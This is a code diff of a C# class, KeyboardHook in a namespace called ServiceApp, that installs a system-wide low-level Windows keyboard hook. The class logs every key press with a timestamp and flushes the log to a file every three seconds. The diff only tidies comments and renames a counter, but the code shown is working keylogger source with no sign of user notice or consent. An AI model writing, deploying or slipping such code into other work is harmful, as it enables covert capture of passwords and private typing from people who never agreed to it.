@@ -9,24 +9,26 @@ namespace ServiceApp
 {
     public static class KeyboardHook
     {
-        // Constants for Windows Hook API
-        private const int WH_KEYBOARD_LL = 13; // Low-level keyboard hook ID
-        private const int WM_KEYDOWN = 0x0100; // Event ID for a key being pressed
+        // Windows Hook ID for Low-Level Keyboard events
+        private const int WH_KEYBOARD_LL = 13;
 
-        // buffer stores keystrokes in memory before saving to disk to improve performance
+        // Event ID for a key being pressed
+        private const int WM_KEYDOWN = 0x0100; 
+
         private static StringBuilder buffer = new StringBuilder();
         private static IntPtr _hookId = IntPtr.Zero;
-        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static LowLevelKeyboardProc _proc = HookCallback; // Kept in a variable to prevent Garbage Collection
         private static System.Timers.Timer timer;
 
+        // Delegate defining the signature for the hook callback function
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        private static int counter = 0;
 
         public static void StartHook()
         {
             _hookId = SetHook(_proc);
-
-            // Initialize a timer to flush the buffer to a file every 3 seconds
-            // This prevents constant disk writing (which is slow and wears out SSDs)
+            
+            // Setup timer to save logs to disk every 3 seconds
             timer = new System.Timers.Timer(3000);
             timer.Elapsed += Timer_Elapsed;
             timer.AutoReset = true;
@@ -35,9 +37,8 @@ namespace ServiceApp
 
         public static void StopHook()
         {
-            // IMPORTANT: Always unhook when closing to prevent system lag or instability
+            // Release the Windows hook
             UnhookWindowsHookEx(_hookId);
-
             timer?.Stop();
             timer?.Dispose();
         }
@@ -47,16 +48,13 @@ namespace ServiceApp
             // Link the hook to the current process module
             using var curProcess = Process.GetCurrentProcess();
             using var curModule = curProcess.MainModule;
-
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                GetModuleHandle(curModule.ModuleName), 0);
+            // Registers the hook with the OS
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
         }
 
-        private static int ok = 0; // Counter to keep track of keys per line (formatting)
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            // nCode >= 0 means the event is valid
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 // Marshal reads the Virtual Key Code from memory
@@ -70,28 +68,24 @@ namespace ServiceApp
                 buffer.Append(vkCode);
                 buffer.Append($":{hour}:{minute}:{second}");
 
-                // Add a space between entries, but wrap to a new line every 10 keys
-                if (ok != 9)
+                if (counter != 9)
                     buffer.Append(" ");
 
-                ok++;
-                if (ok == 10)
+                counter++;
+                if (counter == 10)
                 {
                     buffer.AppendLine();
-                    ok = 0;
+                    counter = 0;
                 }
             }
-            // Pass the event to the next application in the hook chain (CRITICAL)
+            // Pass the event to the next application in the hook chain
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
 
         private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
         {
-            // If nothing was typed in the last 3 seconds, do nothing
-            if (buffer.Length == 0)
-                return;
+            if (buffer.Length == 0) return;
 
-            // Copy buffer content and clear it for the next round
             string data = buffer.ToString();
             buffer.Clear();
 
@@ -110,7 +104,8 @@ namespace ServiceApp
             File.AppendAllText(totalFile, data);
         }
 
-        // P/Invoke: Imports from Windows User32 and Kernel32 libraries
+        // --- Native Windows API Imports ---
+
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
